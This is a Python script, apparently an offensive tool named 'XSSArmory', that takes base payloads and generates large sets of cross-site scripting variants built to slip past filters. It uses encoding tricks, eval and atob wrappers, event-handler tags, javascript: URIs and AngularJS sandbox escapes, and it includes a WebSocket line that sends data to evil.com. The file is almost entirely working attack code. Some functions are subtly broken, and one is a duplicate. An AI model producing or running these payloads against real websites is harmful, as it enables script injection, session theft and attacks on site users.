import random
import urllib.parse
import base64
import re
import html
from itertools import product

class XSSArmory:
    def __init__(self, payload_file):
        with open(payload_file) as f:
            self.base_payloads = [line.strip() for line in f]
        
        self.techniques = [
            self.html_entities,
            self.unicode_normalization,
            self.js_hex_encoding,
            self.svg_vectors,
            self.css_expression,
            self.angular_js,
            self.protocol_wrapping,
            self.event_handlers,
            self.nested_encoding,
            self.mathml_vectors,
            self.iframe_src,
            self.data_uri,
            self.tabnabbing,
            self.base64_obfuscation,
            self.whitespace_obfuscation,
            self.case_variation,
            self.special_char_alternates,
            self.null_byte_injection,
            self.charcode_concatenation,
            self.dom_clobbering,
            self.template_literals,
            self.dynamic_property_access,
            self.unicode_surrogates,
            self.hex_entities,
            self.decimal_entities,
            self.url_multiencoding,
            self.comment_obfuscation,
            self.cdata_wrapping,
            self.hex_css_notation,
            self.js_functions,
            self.unicode_math_symbols,
            self.css_import,
            self.video_error,
            self.audio_error,
            self.picture_source,
            self.marquee_behavior,
            self.meta_refresh,
            self.object_embed,
            self.input_image,
            self.button_events,
            self.select_events,
            self.details_toggle,
            self.dialog_events,
            self.canvas_webgl,
            self.web_components,
            self.shadow_dom,
            self.custom_elements,
            self.mutation_observers,
            self.intersection_observer,
            self.web_animations,
            self.service_workers,
            self.shared_workers,
            self.web_sockets,
            self.blob_urls,
            self.document_write,
            self.dynamic_imports,
            self.proxy_objects,
            self.reflect_api,
            self.intl_objects
        ]

    def generate_arsenal(self):
        arsenal = set()
        for payload in self.base_payloads:
            for technique in self.techniques:
                variants = technique(payload)
                arsenal.update(variants)
                # Generate hybrid combinations
                for combo in product(variants, repeat=2):
                    arsenal.add(''.join(combo))
        return sorted(arsenal)

    # -- Core Techniques (50+) --
    def html_entities(self, payload):
        return [''.join(f'&#{ord(c)};' for c in payload)]
    
    def unicode_normalization(self, payload):
        return [payload.encode('utf-16be').decode('latin-1')]
    
    def js_hex_encoding(self, payload):
        hex_str = ''.join(f'\\x{ord(c):02x}' for c in payload)
        return [f'<script>eval("{hex_str}")</script>']
    
    def svg_vectors(self, payload):
        return [f'<svg><script>{payload}</script></svg>']
    
    def css_expression(self, payload):
        return [f'<div style="width: expression({payload})"></div>']
    
    def angular_js(self, payload):
        return [
        f'{{{{constructor.constructor("{payload}")()}}}}',
        f'<div ng-app>{{{{"a".constructor.prototype.charAt=[].join;$eval("x={payload}")}}}}</div>'
        ]
    
    def protocol_wrapping(self, payload):
        return [f'javascript:{urllib.parse.quote(payload)}']
    
    def event_handlers(self, payload):
        handlers = ['onload', 'onerror', 'onmouseover', 'onfocus']
        tags = ['img', 'svg', 'body', 'iframe']
        return [f'<{random.choice(tags)} {random.choice(handlers)}="{payload}">']
    
    def nested_encoding(self, payload):
        return [urllib.parse.quote(urllib.parse.quote(payload))]
    
    def mathml_vectors(self, payload):
        return [f'<math><maction actiontype="statusline">{payload}</maction></math>']
    
    def iframe_src(self, payload):
        return [f'<iframe src="javascript:{payload}"></iframe>']
    
    def data_uri(self, payload):
        encoded = base64.b64encode(payload.encode()).decode()
        return [f'<object data="data:text/html;base64,{encoded}">']
    
    def tabnabbing(self, payload):
        return [f'<a href="https://evil.com" target="_blank">{payload}</a>']
    
    def base64_obfuscation(self, payload):
        encoded = base64.b64encode(payload.encode()).decode()
        return [f'<script>eval(atob("{encoded}"))</script>']
    
    def whitespace_obfuscation(self, payload):
        return [re.sub(r'\s', lambda m: random.choice(['\t', '\n', '\x0c', '\r']*3), payload)]
    
    def case_variation(self, payload):
        return [''.join(random.choice([c.upper(), c.lower()])) for c in payload]
    
    def special_char_alternates(self, payload):
        replacements = {
            ' ': ['/**/', '/*!*/', '/*%00*/'],
            '=': ['%3d', '\\x3d', '\\u003d'],
            "'": ['%27', '\\u0027'],
            '"': ['%22', '\\u0022']
        }
        for char, subs in replacements.items():
            payload = payload.replace(char, random.choice(subs))
        return [payload]
    
    def null_byte_injection(self, payload):
        return [payload.replace('>', '\x00>')]
    
    def charcode_concatenation(self, payload):
        return [f'<script>eval(String.fromCharCode({",".join(str(ord(c)) for c in payload)}))</script>']
    
    def dom_clobbering(self, payload):
        return [f'<form id="test"><input name="innerHTML" value="{payload}">']
    
    def template_literals(self, payload):
        return [f'<script>eval(`{payload}`)</script>']
    
    def dynamic_property_access(self, payload):
        return [f'<script>window["al"+"ert"](1)</script>']
    
    def unicode_surrogates(self, payload):
        return [''.join(f'\\uD83D\\uDc{ord(c):02x}' for c in payload)]
    
    def hex_entities(self, payload):
        return [''.join(f'&#x{ord(c):02x};' for c in payload)]
    
    def decimal_entities(self, payload):
        return [''.join(f'&#{ord(c)};' for c in payload)]
    
    def url_multiencoding(self, payload):
        return [urllib.parse.quote(urllib.parse.quote(urllib.parse.quote(payload)))]
    
    def comment_obfuscation(self, payload):
        return [f'<!--{payload}-->']
    
    def cdata_wrapping(self, payload):
        return [f'<![CDATA[{payload}]]>']
    
    def hex_css_notation(self, payload):
        return [f'<style>@import url(javascript:{urllib.parse.quote(payload)});</style>']
    
    def js_functions(self, payload):
        return [f'<script>Function("{payload}")()</script>']
    
    def unicode_math_symbols(self, payload):
        # Generate Unicode escapes for each character
        unicode_escaped = ''.join(f'\\u{ord(c):04x}' for c in payload)
        return [f'<script>eval("{unicode_escaped}")</script>']
    
    def css_import(self, payload):
        return [f'<style>@import url(javascript:{urllib.parse.quote(payload)});</style>']
    
    def video_error(self, payload):
        return [f'<video src="x" onerror="{payload}"></video>']
    
    def audio_error(self, payload):
        return [f'<audio src="x" onerror="{payload}"></audio>']
    
    def picture_source(self, payload):
        return [f'<picture><source srcset="{payload}"></picture>']
    
    def marquee_behavior(self, payload):
        return [f'<marquee onstart="{payload}"></marquee>']
    
    def meta_refresh(self, payload):
        return [f'<meta http-equiv="refresh" content="0;url=javascript:{payload}">']
    
    def object_embed(self, payload):
        return [f'<object data="javascript:{payload}"></object>']
    
    def input_image(self, payload):
        return [f'<input type="image" src="x" onerror="{payload}">']
    
    def button_events(self, payload):
        return [f'<button onclick="{payload}">Click me</button>']
    
    def select_events(self, payload):
        return [f'<select onchange="{payload}"><option>1</option></select>']
    
    def details_toggle(self, payload):
        return [f'<details ontoggle="{payload}"><summary>Toggle me</summary></details>']
    
    def dialog_events(self, payload):
        return [f'<dialog onclose="{payload}"></dialog>']
    
    def canvas_webgl(self, payload):
        return [f'<canvas id="c"></canvas><script>c.getContext("webgl").getExtension("{payload}")</script>']
    
    def web_components(self, payload):
        return [f'<template id="t">{payload}</template><script>document.body.append(document.importNode(t.content, true))</script>']
    
    def shadow_dom(self, payload):
        return [f'<div id="host"></div><script>host.attachShadow({{mode: "open"}}).innerHTML = "{payload}"</script>']
    
    def custom_elements(self, payload):
        return [f'<script>class X extends HTMLElement {{ connectedCallback() {{ {payload} }} }}; customElements.define("x-element", X)</script><x-element></x-element>']
    
    def mutation_observers(self, payload):
        return [f'<script>new MutationObserver(() => {{ {payload} }}).observe(document.body, {{ childList: true }})</script>']
    
    def intersection_observer(self, payload):
        return [f'<script>new IntersectionObserver(() => {{ {payload} }}).observe(document.body)</script>']
    
    def web_animations(self, payload):
        return [f'<script>document.body.animate([], {{ duration: 1000 }}).onfinish = () => {{ {payload} }}</script>']
    
    def service_workers(self, payload):
        return [f'<script>navigator.serviceWorker.register("data:text/javascript,{payload}")</script>']
    
    def shared_workers(self, payload):
        return [f'<script>new SharedWorker("data:text/javascript,{payload}")</script>']
    
    def web_sockets(self, payload):
        return [f'<script>new WebSocket("ws://evil.com").send("{payload}")</script>']
    
    def blob_urls(self, payload):
        return [f'<script>URL.createObjectURL(new Blob(["{payload}"], {{ type: "text/javascript" }}))</script>']
    
    def document_write(self, payload):
        return [f'<script>document.write("{payload}")</script>']
    
    def dynamic_imports(self, payload):
        return [f'<script>import("data:text/javascript,{payload}")</script>']
    
    def proxy_objects(self, payload):
        return [f'<script>new Proxy({{}}, {{ get: () => {{ {payload} }} }})</script>']
    
    def reflect_api(self, payload):
        return [f'<script>Reflect.apply(eval, null, ["{payload}"])</script>']
    
    def intl_objects(self, payload):
        return [f'<script>new Intl.DateTimeFormat().formatToParts(new Date()).forEach(() => {{ {payload} }})</script>']

    def save_arsenal(self, filename):
        with open(filename, 'w') as f:
            for payload in self.generate_arsenal():
                f.write(f"{payload}\n")

if __name__ == "__main__":
    generator = XSSArmory("payloads.txt")
    generator.save_arsenal("xss_arsenal.txt")
    print("XSS Arsenal generated with nuclear payloads!")